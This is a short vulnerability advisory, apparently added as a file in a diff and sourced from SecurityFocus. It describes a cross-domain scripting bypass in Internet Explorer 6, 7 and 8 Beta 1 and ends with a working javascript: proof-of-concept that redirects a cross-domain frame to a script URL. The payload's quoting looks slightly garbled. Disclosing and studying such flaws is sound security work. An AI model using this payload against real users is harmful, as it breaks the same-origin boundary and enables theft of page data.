@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/29986/info
+
+Microsoft Internet Explorer is prone to a cross-domain scripting security-bypass vulnerability because the application fails to properly enforce the same-origin policy.
+
+An attacker can exploit this issue to change the location of a frame from a different domain. This allows the attacker to execute arbitrary code in a frame of the same window as content from a different domain. Successful exploits will allow the attacker to access information from the parent document via DOM components that are not domain-reliant (such as the 'onmousedown' event).
+
+Internet Explorer 6, 7, and 8 Beta 1 are vulnerable; other versions may also be affected. 
+
+javascript:x=open('http://example.com/');setInterval(function(){try{x.frames[0].location={toString:function(){return 
+.http://www.example2.com/somescript.html.;}}}catch(e){}},5000);void(1);
